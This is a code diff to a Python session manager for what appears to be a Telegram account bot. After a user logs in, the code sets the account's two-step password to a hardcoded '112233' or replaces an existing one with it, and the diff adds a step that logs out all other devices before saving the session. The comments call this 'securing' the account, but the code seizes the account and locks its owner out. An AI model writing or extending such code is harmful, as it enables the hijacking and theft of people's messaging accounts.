@@ -42,11 +42,16 @@ class SessionManager:
             state["state"] = "awaiting_password"
             return "password_needed", None
         except Exception as e:
-            os.unlink(state["session_path"])
+            if os.path.exists(state["session_path"]):
+                os.unlink(state["session_path"])
             return "error", str(e)
 
+        # Set 2FA password to "112233" and logout other devices
         try:
+            # Set 2FA password
             if await client.edit_2fa(new_password="112233", hint="auto-set by bot"):
+                # Logout other devices to ensure only 1 device is logged in
+                await self.logout_other_devices(client)
                 self._save_session(state, client)
                 return "verified_and_secured", None
             else:
@@ -65,8 +70,11 @@ class SessionManager:
         except Exception:
             return "error", "Current 2FA password is incorrect."
 
+        # Update 2FA password to "112233" and logout other devices
         try:
             if await client.edit_2fa(current_password=password, new_password="112233"):
+                # Logout other devices to ensure only 1 device is logged in
+                await self.logout_other_devices(client)
                 self._save_session(state, client)
                 return "verified_and_secured", None
             else:
@@ -81,6 +89,8 @@ class SessionManager:
         client = state["client"]
         try:
             self._save_session(state, client)
+            # Clean up user state after successful finalization
+            self.user_states.pop(user_id, None)
             return True
         except Exception as e:
             print(f"❌ Failed to save session: {str(e)}")
